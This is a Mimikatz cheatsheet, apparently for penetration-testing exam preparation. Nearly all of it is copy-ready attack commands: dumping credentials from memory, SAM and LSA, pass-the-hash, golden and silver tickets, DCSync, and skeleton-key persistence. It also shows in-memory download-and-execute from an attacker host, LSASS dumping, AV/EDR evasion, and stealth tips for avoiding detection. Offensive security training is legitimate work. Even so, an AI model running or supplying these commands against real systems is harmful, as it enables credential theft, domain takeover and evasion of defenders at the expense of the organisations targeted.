    Mimikatz Cheatsheet

    Overview

    Mimikatz is a powerful post-exploitation tool for extracting credentials, hashes, and Kerberos tickets from Windows systems. This cheatsheet covers essential techniques for exam scenarios.

    Quick Start

    Basic Execution

    # Run Mimikatz
.\mimikatz.exe

# Run with privilege escalation
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# One-liner (all in one command)
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

    Essential Commands

    # Check privileges
privilege::debug

# Dump credentials
sekurlsa::logonpasswords

# Dump SAM
lsadump::sam

# Dump LSA secrets
lsadump::secrets

# List tickets
sekurlsa::tickets

    Installation & Setup

    Download Mimikatz

    # From attacker machine (Kali)
wget https://github.com/gentilkiwi/mimikatz/releases/latest

# Or use local copy
locate mimikatz
/usr/share/windows-resources/mimikatz/

    Transfer to Target

    # SMB Server (from Kali)
sudo impacket-smbserver share $(pwd) -smb2support -username user -password pass

# Download from target
net use \\10.10.14.5\share /user:user pass
copy \\10.10.14.5\share\mimikatz.exe .

# PowerShell download
IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/mimikatz.exe','mimikatz.exe')

# Certutil
certutil -urlcache -f http://10.10.14.5/mimikatz.exe mimikatz.exe

    Privilege Escalation

    Debug Privilege

    # Required for most operations
mimikatz # privilege::debug
Privilege '20' OK

# One-liner
mimikatz.exe "privilege::debug" "exit"

    Token Elevation

    # Elevate to SYSTEM
mimikatz # token::elevate

# Elevate to specific user
mimikatz # token::elevate /user:DOMAIN\Administrator

# List tokens
mimikatz # token::list

# Revert token
mimikatz # token::revert

    SAM Database

    # Dump SAM hashes (requires SYSTEM)
mimikatz # lsadump::sam

# With SYSTEM registry hive
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# One-liner
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

    LSA Secrets

    # Dump LSA secrets
mimikatz # lsadump::secrets

# Dump cached credentials
mimikatz # lsadump::cache

# One-liner
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

    Pass-the-Hash

    PTH with Mimikatz

    # Pass-the-Hash to get shell
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:cmd.exe

# PTH with PowerShell
mimikatz # sekurlsa::pth /user:Administrator /domain:CORP /ntlm:HASH /run:powershell.exe

# PTH for specific process
mimikatz # sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:"C:\Windows\System32\cmd.exe"

    One-Liner: 

    mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:e19ccf75ee54e06b06a5907af13cef42 /run:cmd.exe" "exit"

    Using PTH Shell

    # After PTH, you have a new cmd.exe with those credentials
# Access remote shares
dir \\DC01\C$

# Execute remote commands
psexec.exe \\DC01 cmd.exe

# RDP (if enabled)
mstsc /v:DC01

    Kerberos Attacks

    Dump Kerberos Tickets

    # List all tickets in memory
mimikatz # sekurlsa::tickets

# List tickets with export
mimikatz # sekurlsa::tickets /export

# Export specific ticket
mimikatz # kerberos::list /export

    Golden Ticket Attack

    Requirements: - Domain name - Domain SID - krbtgt NTLM hash - Username to impersonate

    # Get domain SID
mimikatz # lsadump::lsa /patch
# Look for "Domain SID"

# Create Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:e19ccf75ee54e06b06a5907af13cef42 /id:500 /ptt

# Explanation:
# /user - Username to impersonate
# /domain - Domain FQDN
# /sid - Domain SID (without RID)
# /krbtgt - krbtgt NTLM hash
# /id - User RID (500 = Administrator)
# /ptt - Pass the ticket (inject immediately)

    One-Liner Golden Ticket: 

    mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:HASH /id:500 /ptt" "exit"

    Silver Ticket Attack

    Create service-specific ticket: 

    # Silver ticket for CIFS (file sharing)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:dc01.corp.local /service:cifs /rc4:MACHINE_ACCOUNT_HASH /ptt

# Silver ticket for HTTP
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:DOMAIN_SID /target:web01.corp.local /service:http /rc4:MACHINE_HASH /ptt

# Common services:
# cifs - File sharing
# http - Web services
# host - Scheduled tasks, WMI
# ldap - LDAP queries
# mssql - SQL Server

    Pass-the-Ticket (PTT)

    # Export tickets
mimikatz # sekurlsa::tickets /export

# List exported tickets
dir *.kirbi

# Inject ticket
mimikatz # kerberos::ptt ticket.kirbi

# Purge existing tickets first
mimikatz # kerberos::purge
mimikatz # kerberos::ptt ticket.kirbi

# One-liner
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

    Kerberoasting

    # Request service tickets
mimikatz # kerberos::list

# Export tickets for cracking
mimikatz # kerberos::list /export

# Or use built-in kerberoast
mimikatz # kerberos::ask /target:SPN

    DCSync Attack

    Requirements

    • Replicating Directory Changes
    • Replicating Directory Changes All
    • Replicating Directory Changes In Filtered Set

    Basic DCSync

    # Sync specific user
mimikatz # lsadump::dcsync /user:DOMAIN\Administrator

# Sync krbtgt account (for Golden Ticket)
mimikatz # lsadump::dcsync /user:DOMAIN\krbtgt

# Sync all users
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# Sync with specific DC
mimikatz # lsadump::dcsync /dc:dc01.corp.local /user:Administrator

    One-Liner DCSync: 

    mimikatz.exe "lsadump::dcsync /user:CORP\Administrator" "exit"

mimikatz.exe "lsadump::dcsync /user:CORP\krbtgt" "exit"

    Output: 

    Object RDN           : Administrator
SAM Username         : Administrator
User Principal Name  : administrator@corp.local
SID                  : S-1-5-21-...
Hash NTLM: e19ccf75ee54e06b06a5907af13cef42

    Practical Scenarios

    Scenario 1: Local Admin → Domain Admin

    # 1. Check if you're local admin
whoami /groups | findstr "S-1-5-32-544"

# 2. Dump credentials
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# 3. Look for Domain Admin credentials in output
type output.txt | findstr /i "domain admin"

# 4. Use those credentials or hashes
# Option A: Pass-the-Hash
mimikatz.exe "sekurlsa::pth /user:DA_USER /domain:CORP /ntlm:HASH /run:cmd.exe"

# Option B: If you have password, just use it
runas /user:CORP\DA_USER cmd.exe

    Scenario 2: Extract All Credentials

    # Complete credential dump (one command)
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit" > all_creds.txt

# Review output
type all_creds.txt | findstr /i "password ntlm"

    Scenario 3: DCSync for Golden Ticket

    # 1. DCSync krbtgt
mimikatz.exe "lsadump::dcsync /user:CORP\krbtgt" "exit" > krbtgt.txt

# 2. Extract NTLM hash from output
type krbtgt.txt | findstr "Hash NTLM"

# 3. Get domain SID
mimikatz.exe "lsadump::lsa /patch" "exit" | findstr "Domain SID"

# 4. Create Golden Ticket
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:DOMAIN_SID /krbtgt:KRBTGT_HASH /id:500 /ptt" "exit"

# 5. Verify ticket
klist

# 6. Access DC
dir \\DC01\C$

    Scenario 4: Quick Hash Extraction

    # Fastest way to get hashes
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" > hashes.txt

# Parse for NTLM hashes
type hashes.txt | findstr "NTLM"

    One-Liner Commands

    Essential One-Liners

    # 1. Dump all passwords from memory
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 2. Dump SAM hashes
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# 3. Dump LSA secrets
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

# 4. Export all Kerberos tickets
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# 5. Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:HASH /run:cmd.exe" "exit"

# 6. DCSync Administrator
mimikatz.exe "lsadump::dcsync /user:CORP\Administrator" "exit"

# 7. DCSync krbtgt (for Golden Ticket)
mimikatz.exe "lsadump::dcsync /user:CORP\krbtgt" "exit"

# 8. Golden Ticket
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:HASH /id:500 /ptt" "exit"

# 9. Pass-the-Ticket
mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

# 10. Complete dump (everything)
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "exit"

    PowerShell One-Liners

    # Execute and capture output
$output = .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
$output | Select-String -Pattern "Password|NTLM"

# Download and execute in memory (Invoke-Mimikatz)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

# Remote execution
Invoke-Mimikatz -ComputerName @("server1","server2") -DumpCreds

    Advanced Techniques

    Dump LSASS Manually

    # Create LSASS dump file
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# Find LSASS PID
tasklist | findstr lsass

# Example
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 628 C:\temp\lsass.dmp full

# Parse dump offline (on Kali)
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

    Registry Extraction

    # Save registry hives
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Parse with Mimikatz
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM
mimikatz # lsadump::secrets /system:SYSTEM /security:SECURITY

    Skeleton Key

    # Inject skeleton key (persist access to DC)
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Now any user can login with password: "mimikatz"
# Example:
net use \\DC01\C$ /user:Administrator mimikatz

    DPAPI

    # Dump DPAPI masterkeys
mimikatz # sekurlsa::dpapi

# Decrypt credentials
mimikatz # dpapi::cred /in:"C:\Users\User\AppData\Local\Microsoft\Credentials\ABC123"

# Dump Chrome passwords
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"

    Evasion Techniques

    Bypass AV/EDR

    # Use Invoke-Mimikatz (in-memory)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Use obfuscated version
# Download pre-obfuscated Mimikatz

# Use SafetyKatz (Cobalt Strike)
# Uses MiniDumpWriteDump instead of direct LSASS access

    Alternative Methods

    # Use ProcDump instead
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Parse offline
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

    Post-Exploitation

    After Getting Hashes

    # 1. Crack hashes
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 2. Pass-the-Hash
impacket-psexec -hashes :NTLM_HASH DOMAIN/Administrator@TARGET
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/Administrator@TARGET
impacket-smbexec -hashes :NTLM_HASH DOMAIN/Administrator@TARGET

# 3. Use CrackMapExec
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH
crackmapexec smb 192.168.1.100 -u Administrator -H NTLM_HASH -x "whoami"

    After Getting Golden Ticket

    # Verify ticket loaded
klist

# Access any system in domain
dir \\DC01\C$
dir \\SERVER01\C$
dir \\WORKSTATION01\C$

# Execute commands
psexec.exe \\DC01 cmd.exe
psexec.exe \\SERVER01 cmd.exe

# Dump more credentials
mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" "exit"

    Exam Workflow

    Phase 1: Initial Access (After Getting Admin)

    # 1. Quick credential dump
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt

# 2. Review output
type creds.txt | findstr /i "username domain password ntlm"

# 3. Save all credentials to notes immediately

    Phase 2: Privilege Escalation to Domain Admin

    # 1. Check for DA credentials in memory
type creds.txt | findstr /i "domain admin"

# 2. If found, extract hash
# NTLM: e19ccf75ee54e06b06a5907af13cef42

# 3. Pass-the-Hash to new session
mimikatz.exe "sekurlsa::pth /user:DomainAdmin /domain:CORP /ntlm:HASH /run:cmd.exe"

# 4. From new CMD, access DC
dir \\DC01\C$

    Phase 3: Persistence/Complete Compromise

    # 1. DCSync all users
mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" "exit" > all_users.txt

# 2. DCSync krbtgt for Golden Ticket
mimikatz.exe "lsadump::dcsync /user:CORP\krbtgt" "exit" > krbtgt.txt

# 3. Create Golden Ticket (if needed)
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:DOMAIN_SID /krbtgt:HASH /id:500 /ptt"

# 4. Document everything for report

    Troubleshooting

    Common Errors

    1. "Privilege '20' ERROR" 

    # Not running as admin
# Solution: Elevate privileges first
runas /user:Administrator cmd.exe

    2. "ERROR kuhl_m_sekurlsa_acquireLSA" 

    # LSASS protected or AV blocking
# Solution: Use alternative method
procdump.exe -ma lsass.exe lsass.dmp
# Parse offline

    3. No passwords found, only NTLM 

    # WDigest disabled (Windows 8.1+)
# Solution: Use Pass-the-Hash with NTLM

    4. "Access Denied" on DCSync 

    # User lacks replication rights
# Solution: Check permissions or use different account
Get-ADUser username -Properties *

    Pro Tips

    Exam Tips

    • Run Mimikatz immediately after gaining admin access
    • Save all output to files for later reference
    • Extract both passwords and NTLM hashes
    • Try Pass-the-Hash if you can't crack hashes
    • Look for Domain Admin credentials in memory
    • Document all credentials with timestamps
    • DCSync if you have the rights - fastest way to get all hashes

    Stealth Tips

    • Use one-liners for quick execution
    • Delete Mimikatz binary after use
    • Use in-memory execution (Invoke-Mimikatz)
    • Dump LSASS to file and parse offline
    • Avoid skeleton key (very noisy)

    Common Mistakes

    • Not running privilege::debug first
    • Forgetting to elevate token for SAM/secrets
    • Not saving output (Mimikatz output scrolls fast)
    • Using wrong domain SID for Golden Ticket
    • Not verifying tickets with klist after PTT
    • Forgetting to purge old tickets before PTT

    Restrictions

    • Don't use automated AD exploitation tools beyond scope
    • Document your methodology clearly
    • Note all credentials found with context
    • Explain privilege escalation path in report
    • Show screenshots of successful exploitation

    Essential Commands

    # 1. Dump all credentials (most important)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# 2. Dump SAM hashes
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# 3. Pass-the-Hash
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:CORP /ntlm:HASH /run:cmd.exe"

# 4. DCSync (if DA)
mimikatz.exe "lsadump::dcsync /user:CORP\krbtgt" "exit"

# 5. Golden Ticket (domain persistence)
mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:SID /krbtgt:HASH /ptt" "exit"

    Remember:

    1. Always run privilege::debug first
    2. Save output to file - don't rely on memory
    3. Extract both passwords AND hashes
    4. Try Pass-the-Hash if cracking fails
    5. DCSync is your friend - fastest credential extraction
    6. Document everything for the report
